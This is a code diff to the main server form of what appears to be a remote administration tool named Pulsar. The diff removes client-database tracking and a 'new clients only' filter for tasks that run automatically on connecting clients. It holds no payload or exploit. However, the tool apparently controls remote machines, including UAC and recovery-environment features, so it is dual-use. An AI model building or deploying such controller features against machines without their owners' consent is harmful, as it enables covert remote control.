@@ -25,9 +25,10 @@ using Pulsar.Common.Messages.QuickCommands;
 using System.IO;
 using System.Text.Json;
 using System.Drawing;
+using System.Xml;
 using Pulsar.Common.Messages.Monitoring.VirtualMonitor;
 using Newtonsoft.Json;
-using Pulsar.Server.Database;
+
 using Pulsar.Common.Messages.ClientManagement.UAC;
 using Pulsar.Common.Messages.ClientManagement.WinRE;
 
@@ -52,7 +53,6 @@ namespace Pulsar.Server.Forms
         private readonly object _lockClients = new object();
         private PreviewHandler _previewImageHandler;
         private readonly string AutoTasksFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "autotasks.json");
-        private ClientDatabase _clientDatabase;
 
         public FrmMain()
         {
@@ -152,7 +152,6 @@ namespace Pulsar.Server.Forms
             ListenServer.ServerState += ServerState;
             ListenServer.ClientConnected += ClientConnected;
             ListenServer.ClientDisconnected += ClientDisconnected;
-            _clientDatabase = new ClientDatabase();
         }
 
         private void StartConnectionListener()
@@ -464,13 +463,6 @@ namespace Pulsar.Server.Forms
             }
             else
             {
-                // Add or update client in database
-                _clientDatabase.AddOrUpdateClient(
-                    client.Value.Id,
-                    client.EndPoint.Address.ToString(),
-                    client.Value.UserAtPc,
-                    true
-                );
                 lock (_clientConnections)
                 {
                     if (!ListenServer.Listening) return;
@@ -491,8 +483,6 @@ namespace Pulsar.Server.Forms
 
         private void ClientDisconnected(Client client)
         {
-            // mark client as offline
-            _clientDatabase.SetClientOffline(client.Value.Id);
             lock (_clientConnections)
             {
                 if (!ListenServer.Listening) return;
@@ -565,6 +555,8 @@ namespace Pulsar.Server.Forms
 
         private void StartAutomatedTask(Client client)
         {
+            Debug.WriteLine(IsClientBlocked(client.EndPoint.Address.ToString()) ? "Blocked client, skipping automated tasks." : "Starting automated tasks for client.");
+
             if (lstTasks.InvokeRequired)
             {
                 lstTasks.Invoke(new Action(() => StartAutomatedTask(client)));
@@ -573,9 +565,6 @@ namespace Pulsar.Server.Forms
 
             foreach (ListViewItem item in lstTasks.Items)
             {
-                bool newClientsOnly = item.Tag is bool b && b;
-                if (newClientsOnly && !IsClientNew(client))
-                    continue;
                 string taskCaption = item.Text;
                 string subItem0 = item.SubItems.Count > 1 ? item.SubItems[1].Text : "N/A";
                 string subItem1 = item.SubItems.Count > 2 ? item.SubItems[2].Text : "N/A";
@@ -623,27 +612,6 @@ namespace Pulsar.Server.Forms
                         break;
                 }
             }
-        }
-
-        private bool IsClientNew(Client client)
-        {
-            using (var conn = new System.Data.SQLite.SQLiteConnection("Data Source=clients.db;Version=3;"))
-            {
-                conn.Open();
-                var cmd = conn.CreateCommand();
-                cmd.CommandText = "SELECT FirstSeen, LastSeen FROM Clients WHERE Id = @id";
-                cmd.Parameters.AddWithValue("@id", client.Value.Id);
-                using (var reader = cmd.ExecuteReader())
-                {
-                    if (reader.Read())
-                    {
-                        var first = reader.GetDateTime(0);
-                        var last = reader.GetDateTime(1);
-                        return first == last;
-                    }
-                }
-            }
-            return false;
         }
 
         public void SetToolTipText(Client client, string text)
@@ -1737,12 +1705,11 @@ namespace Pulsar.Server.Forms
             }
         }
 
-        public void AddTask(string title, string param1, string param2, bool newClientsOnly = false)
+        public void AddTask(string title, string param1, string param2)
         {
             ListViewItem newItem = new ListViewItem(title);
             newItem.SubItems.Add(param1);
             newItem.SubItems.Add(param2);
-            newItem.Tag = newClientsOnly;
             lstTasks.Items.Add(newItem);
             SaveAutoTasks();
         }
@@ -2126,8 +2093,7 @@ namespace Pulsar.Server.Forms
                 {
                     Title = item.Text,
                     Param1 = item.SubItems.Count > 1 ? item.SubItems[1].Text : "",
-                    Param2 = item.SubItems.Count > 2 ? item.SubItems[2].Text : "",
-                    NewClientsOnly = item.Tag is bool b && b
+                    Param2 = item.SubItems.Count > 2 ? item.SubItems[2].Text : ""
                 });
             }
             File.WriteAllText(AutoTasksFilePath, JsonConvert.SerializeObject(tasks, Newtonsoft.Json.Formatting.Indented));
@@ -2145,7 +2111,7 @@ namespace Pulsar.Server.Forms
                     {
                         foreach (var task in tasks)
                         {
-                            AddTask(task.Title, task.Param1, task.Param2, task.NewClientsOnly);
+                            AddTask(task.Title, task.Param1, task.Param2);
                         }
                     }
                 }
@@ -2162,7 +2128,6 @@ namespace Pulsar.Server.Forms
         public string Title { get; set; }
         public string Param1 { get; set; }
         public string Param2 { get; set; }
-        public bool NewClientsOnly { get; set; }
     }
 
     #endregion AutoTaskStuff
